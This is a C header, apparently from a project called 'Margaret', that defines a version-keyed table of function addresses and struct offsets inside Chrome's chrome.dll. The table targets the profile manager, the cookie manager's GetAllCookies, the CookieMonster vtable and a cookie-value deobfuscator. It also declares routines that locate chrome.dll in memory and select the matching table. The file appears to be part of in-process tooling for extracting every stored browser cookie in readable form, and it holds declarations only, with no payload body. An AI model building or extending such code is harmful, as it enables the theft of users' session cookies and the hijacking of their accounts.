#ifndef MARGARET_CHROMIUM_ADAPTER_H
#define MARGARET_CHROMIUM_ADAPTER_H

#include "resolve.h"

#define MARGARET_CHROMIUM_PRODUCT_CHROME 1u
#define MARGARET_CHROMIUM_TEXT_FINGERPRINT_SIZE 32u

typedef struct MARGARET_CHROMIUM_ADAPTER {
    DWORD AdapterVersion;
    DWORD Product;
    DWORD VersionMajor;
    DWORD VersionMinor;
    DWORD VersionBuild;
    DWORD VersionPatch;
    DWORD ImageSize;
    DWORD CallbackAbiVersion;
    DWORD CanonicalCookieLayoutVersion;
    BYTE TextFingerprint[MARGARET_CHROMIUM_TEXT_FINGERPRINT_SIZE];

    DWORD RvaGBrowserProcessSlot;
    DWORD RvaGetProfileManager;
    DWORD RvaGetLoadedProfiles;
    DWORD RvaGetDefaultStoragePartition;
    DWORD RvaGetCookieManager;
    DWORD RvaCookieManagerGetAllCookies;
    DWORD RvaGetUiTaskRunner;
    DWORD RvaPostTask;
    DWORD RvaCallbackInvoker;

    DWORD OffBrowserProcessProfileManager;
    DWORD OffStoragePartitionCookieManager;
    DWORD OffMojoRemoteProxy;
    DWORD OffMojoRemoteState;

    WORD VtblCookieManagerGetAllCookies;
    WORD VtblTaskRunnerPostTask;

    /* Network-utility anchors. */
    DWORD RvaCookieMonsterVtable;
    DWORD RvaCookieMonsterGetAllCookies;

    /* Direct value accessors; deobfuscator(&value, &out). */
    DWORD RvaCanonicalCookieValue;
    DWORD RvaCanonicalCookieDeobfuscator;

    /* Reserved browser-process fields. */
    DWORD RvaBrowserTaskExecutorSingleton;
    DWORD OffEndpointTaskRunner;
    DWORD RvaCfgSlotRegionStart;
    DWORD RvaCfgSlotRegionEnd;
    DWORD RvaCfgThunkLo;
    DWORD RvaCfgThunkHi;

    DWORD Reserved;
} MARGARET_CHROMIUM_ADAPTER;

/* Select a fail-closed adapter for the loaded chrome.dll. */
CODE_SECTION BOOL MS_ABI
MargaretSelectChromiumAdapter(PVOID chromeBase, DWORD imageSize,
                              MARGARET_CHROMIUM_ADAPTER *outAdapter);

/* Locate chrome.dll and validate its PE without partial outputs. */
BOOL MS_ABI MargaretLocateChromeDll(RESOLVER_CONTEXT *ctx,
                                             PVOID *chromeBase,
                                             DWORD *imageSize);

#endif /* MARGARET_CHROMIUM_ADAPTER_H */
